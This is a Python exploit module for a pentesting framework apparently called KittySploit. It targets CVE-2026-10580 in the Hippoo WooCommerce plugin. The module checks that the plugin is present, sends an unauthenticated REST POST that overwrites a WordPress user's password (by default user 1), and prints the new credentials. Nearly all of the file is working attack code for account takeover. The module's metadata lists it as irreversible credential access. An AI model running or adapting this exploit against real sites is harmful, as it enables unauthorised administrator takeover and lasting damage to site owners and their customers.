#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Hippoo CVE-2026-10580 — unauthenticated REST password reset."""

import json
import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Hippoo CVE-2026-10580 REST password reset",
        "description": (
            "Auxiliary for CVE-2026-10580: Hippoo Mobile App for WooCommerce <= 1.9.4 allows "
            "unauthenticated POST /wp-json/wc-hippoo/v1/ext/wp/v2/users/{id} with "
            "{\"password\": \"...\"}. Outputs new credentials — does not open a framework session."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-10580"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-10580",
            "https://plugins.trac.wordpress.org/changeset/3557733",
        ],
        "tags": ["wordpress", "hippoo", "woocommerce", "password-reset", "auxiliary", "cve-2026-10580"],
        "agent": {
            "risk": "critical",
            "effects": ["active_exploitation", "credential_access"],
            "expected_requests": 2,
            "reversible": False,
            "approval_required": True,
            "produces": ["credentials", "exploit_paths"],
            "chain": {
                "suggested_followups": [
                    "scanner/http/hippoo_cve_2026_10580_detect",
                ],
            },
        },
    }

    path = OptString("/", "WordPress base path", required=False)
    user_id = OptInteger(1, "Target WordPress user ID", required=False)
    new_password = OptString("", "New password (empty = random)", required=False)

    def _base(self) -> str:
        return self.wp_normalize_base_path(self.path or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{root}{suffix}" if root != "/" else suffix

    def check(self):
        readme = self.http_request(
            method="GET",
            path=self.wp_plugin_path(self._base(), "hippoo", "readme.txt"),
            allow_redirects=True,
        )
        if not readme or readme.status_code != 200:
            return {"vulnerable": False, "reason": "Hippoo plugin not found", "confidence": "medium"}
        return {"vulnerable": True, "reason": "Hippoo plugin present", "confidence": "medium"}

    def run(self):
        chk = self.check()
        if not chk.get("vulnerable"):
            print_error(chk.get("reason"))
            return False
        uid = int(self.user_id or 1)
        password = (self.new_password or "").strip() or secrets.token_urlsafe(14)
        endpoint = self._join(f"/wp-json/wc-hippoo/v1/ext/wp/v2/users/{uid}")
        response = self.http_request(
            method="POST",
            path=endpoint,
            headers={"Content-Type": "application/json"},
            data=json.dumps({"password": password}),
            allow_redirects=False,
        )
        if not response or response.status_code != 200:
            print_error(f"Password reset failed (HTTP {getattr(response, 'status_code', 'n/a')})")
            return False
        body = response.text or ""
        user_match = re.search(r'"username"\s*:\s*"([^"]+)"', body)
        username = user_match.group(1) if user_match else f"user-{uid}"
        print_success(f"Password reset accepted for {username} (id {uid})")
        print_status(f"Credentials: {username}:{password}")
        return True
